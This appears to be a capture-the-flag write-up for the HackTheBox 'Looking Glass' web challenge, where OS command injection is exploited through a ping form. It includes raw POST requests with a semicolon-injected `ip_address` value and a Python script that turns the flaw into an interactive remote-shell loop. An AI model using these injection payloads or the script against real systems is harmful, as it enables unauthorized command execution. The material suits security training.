---
title: "HackTheBox Writeup- Looking Glass"

categories: [HacktheBox - Challenges]

tags: [easy,RCE,Scripting,Web]

image: https://d3an9kf42ylj3p.cloudfront.net/uploads/2012/12/Looking-Glass-300x300.jpg
---


## CHALLENGE DESCRIPTION

We've built the most secure networking tool in the market, come and check it out!


## PROOF OF CONCEPT
The Looking  Glass website allow the user the troubleshoot and check status of the server the server’s through `ping` and `traceroute` commands 

![Untitled](/assets/img/looking_glass/Untitled.png)


&nbsp;

By intercepting (Burp_suite) the request , it sends a `POST` request to the server to perform a ping request to the IP `206.189.120.31` 

```bash
POST / HTTP/1.1
Host: 206.189.120.31:31868
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://206.189.120.31:31868
Connection: close
Referer: http://206.189.120.31:31868/
Upgrade-Insecure-Requests: 1

test=ping&ip_address=206.189.120.31&submit=Test
```

&nbsp;

In the Response , It  can observed that  the output put of ping .

![Untitled](/assets/img/looking_glass/Untitled1.png)

&nbsp; 

The  semicolon (`;`) either in windows command Prompt or linux terminal is used to seperate multiple command in a single line .
&nbsp; 

In the below request the , after the parameter `ip_address` ,inserted the semicolon  to separate the first command , so any next command command can be executed. 

Now, next to the parameter `ip_address=;ls+la`   is placed to verify  the remote code can be executed .

```python
POST / HTTP/1.1
Host: 206.189.120.31:31868
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://206.189.120.31:31868
Connection: close
Referer: http://206.189.120.31:31868/
Upgrade-Insecure-Requests: 1

test=ping&ip_address=;ls+-la&submit=Test
```

&nbsp; 

From the below output of list view of the `ls+-la` command ,it is visible that the aribitary remote commands can be executed on the server.

![Untitled](/assets/img/looking_glass/Untitled2.png)

&nbsp; 

In the root directory(`/`) , have the flag to the challenge.

![Untitled](/assets/img/looking_glass/Untitled3.png)

&nbsp; 

I have writren a python script to automate the process to run shell command from command line

```python
import requests,sys
from bs4 import BeautifulSoup as bs
import urllib

# your ip here 
ip = '206.189.120.31:31868' 

headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-GB,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Content-Length': '36',
        'Origin': f'http://{ip}',
        'Connection': 'close',
        'Referer': f'http://{ip}',
        'Upgrade-Insecure-Requests': '1',
}

try:
    with requests.session() as s:
        request = s.get(f'http://{ip}/')
        if request.ok:
            while True:
                try:
                    cmd = input("\033[0;32mRCE\033[0m -> ")
                    command = urllib.parse.unquote(cmd)
                    data = f'test=ping&ip_address=;{command}&submit=Test'
                    response = s.post(f'http://{ip}/', headers=headers, data=data, verify=False)
                    resp = response.content.decode()
                    soup = bs(resp,"html.parser")
                    text = soup.find_all('textarea')[0].text
                    print(text.strip())
                except KeyboardInterrupt:
                        sys.exit()
                except ConnectionError:
                        print('lost connection to the Server')
                        sys.exit()
        else:
            print("check the connection")         
finally:
    pass
```

&nbsp; 

This the output of the python script

![Untitled](/assets/img/looking_glass/Untitled4.png)